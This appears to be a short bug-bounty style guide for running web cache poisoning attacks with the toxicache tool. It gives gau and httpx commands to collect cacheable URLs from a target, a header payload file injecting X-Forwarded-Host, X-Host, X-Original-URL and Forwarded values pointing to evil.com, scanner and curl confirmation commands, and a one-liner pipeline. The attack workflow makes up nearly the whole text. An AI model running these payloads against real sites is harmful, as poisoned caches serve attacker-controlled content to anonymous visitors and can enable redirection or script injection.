## 🔥 Fastest Automation Method (toxicache)

### 📂 Input Required

* `urls.txt` → **ONLY cacheable GET endpoints**
* `headers.txt` → cache-poisoning payloads

---

## ⚡ Step 1: Collect cacheable URLs (FAST)

```bash
gau target.com | grep -E "\.(js|css|png|jpg|json)$|/$" | sort -u > urls.txt
```

(Optional – filter live only)

```bash
httpx -silent -mc 200 -l urls.txt > live.txt
```

---

## ⚡ Step 2: Create header payload file

```bash
cat > headers.txt <<EOF
X-Forwarded-Host: evil.com
X-Host: evil.com
X-Original-URL: /evil
X-Rewrite-URL: /evil
Forwarded: host=evil.com
EOF
```

---

## ⚡ Step 3: Run toxicache (MULTI-THREAD)

```bash
toxicache scan \
  -i live.txt \
  -H headers.txt \
  -c 50 \
  -timeout 5 \
  -o toxicache_results.txt
```

💥 This tests **unkeyed headers + cache storage behavior** in parallel.

---

## 🧠 Why this is FAST

* Go-based concurrency
* Header-only poisoning (low noise)
* No parameter fuzzing
* Direct cache hit comparison

---

## 🎯 What to Look For

Valid hits usually show:

* Cached response contains **evil.com**
* Poison persists across requests
* Affects anonymous users

---

## ⚠️ Speed Tips (Pro)

* Test **root paths first**: `/`, `/index`
* Focus on **static assets**
* Avoid authenticated URLs initially
* Increase threads only after testing

---

## 🧪 Manual Confirm (1 Request)

```bash
curl -H "X-Forwarded-Host: evil.com" https://target.com
```

Then reload without header → see if poison persists.

---

## 🔥 One-Liner (Ultra Fast)

```bash
gau target.com | httpx -silent | toxicache scan -c 50
```
use url file not subd file
